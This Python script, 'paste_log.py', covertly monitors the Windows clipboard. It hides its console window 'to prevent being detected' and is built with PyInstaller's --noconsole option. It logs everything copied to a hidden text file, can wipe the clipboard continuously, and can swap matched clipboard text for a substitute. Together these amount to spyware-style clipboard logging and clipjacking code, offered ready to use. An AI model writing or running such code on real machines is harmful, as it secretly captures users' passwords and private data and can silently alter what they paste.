'''
paste_log.py, version 1.0.1
script for logging copy-paste content
pyinstaller proper command:
    pyinstaller -F --noconsole paste_log.py
'''
import sys
import os
import time
import ctypes
import pyperclip

def script_path():
    ''' change directory to script path '''
    current_path = os.path.realpath(os.path.dirname(sys.argv[0]))
    os.chdir(current_path)
    return current_path


def create_log_path():
    ''' get python executable path, create path to log.txt in there '''
    python_path, _ = os.path.split(sys.executable)
    log_path = os.path.join(python_path, 'log.txt')
    return log_path


def simple_write(file_path, str_content):
    '''simple_write data to .txt file, with specified strContent'''
    with open(file_path, "a") as file:
        file.write(str_content + "\n")
        file.close()
    return True


def hide_console():
    ''' hide console, to prevent being detected '''
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    return True


def log_changes(log_path='', timeout=0.01):
    ''' control changes and log clipboard '''
    hide_console()
    last_content = ""
    if not log_path:
        log_path = create_log_path()
    while True:
        content = pyperclip.paste()
        if content != last_content:
            # print("current conent: {}".format(content))   # just for debugging
            simple_write(log_path, content + "\n" + 20*"--" + "\n")
            last_content = content
        time.sleep(timeout)
    return True


def clear_clipboard(timeout=0.01):
    ''' clear clipboard continously '''
    hide_console()
    while True:
        pyperclip.copy('')
        time.sleep(timeout)
    return True


def replace_clipboard(search, thing, timeout=0.01):
    ''' control clipboard and replace with specified phrase '''
    hide_console()
    while True:
        content = pyperclip.paste()
        if content == search:       # this is the simplest condition; thinkg of regex etc
            pyperclip.copy(thing)
        time.sleep(timeout)
    return True


if __name__ == "__main__":
    PATH = script_path()
    # log_changes()
    # clear_clipboard()
    # replace_clipboard("test", "tricked")
    # hide_console()
